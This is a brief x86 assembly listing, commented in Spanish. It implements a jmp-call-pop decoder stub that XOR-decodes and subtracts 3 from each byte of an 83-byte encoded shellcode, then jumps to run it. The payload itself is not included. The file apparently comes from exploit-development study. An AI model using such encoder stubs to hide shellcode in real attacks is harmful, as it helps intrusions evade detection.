global _start
_start:
	jmp short Funcion0	;Salta a la etiqueta Funcion0 
				;short = salto corto de -128 a + 127 bytes

init:
	pop esi			;Recupera el valor de la pila y la coloca en esi
				;esi apuntará al primer byte de la shell codificada
	xor ecx, ecx		;Limpiamos ecx a 0
	mov cl, 0x53		;Se define el tamaño del exploit (83 bytes o 0x53)
desc:
	xor byte [esi + ecx - 1], 0xaf	;De la posición actual esi + ecx - 1
					;hacemos un XOR con 0xaf y se guarda en la misma ubicación de memoria
	sub byte[esi + ecx - 1], 0x3	;Restamos 0x3 bytes al valor actual para obtener byte original
	sub cl, 1			;Restamos 1 al valor actual de cl para recorrer todos los bytes del exploit
	jnz desc		;Si el resultado previo no es cero, salta de nuevo a desc
	jmp short sc		;Una vez teniendo los valores originales,
				;se realiza un salto incondicional hacia sc para ejecutar el exploit

Funcion0:
	call init

sc:
